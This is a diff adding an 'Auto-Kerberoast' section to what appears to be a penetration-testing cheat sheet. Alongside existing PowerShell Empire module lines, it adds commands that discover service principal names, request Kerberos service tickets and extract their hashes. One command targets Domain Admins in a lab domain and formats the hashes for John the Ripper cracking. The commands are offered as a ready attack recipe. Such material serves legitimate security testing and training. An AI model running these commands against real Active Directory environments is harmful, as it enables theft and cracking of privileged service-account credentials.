@@ -26,3 +26,17 @@ usemodule situational_awareness/network/get_spn
 ```
 usemodule credentials/invoke_kerberoast
 ```
+# Auto-Kerberoast
+
+**SPN Discovery**
+```
+List-UserSPNs
+```
+**Service Ticket Request & Hash Extraction**
+```
+Invoke-AutoKerberoast
+```
+**Service Ticket Request & Hash Extraction for Domain Admins**
+```
+Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain pentestlab.local -HashFormat John
+```
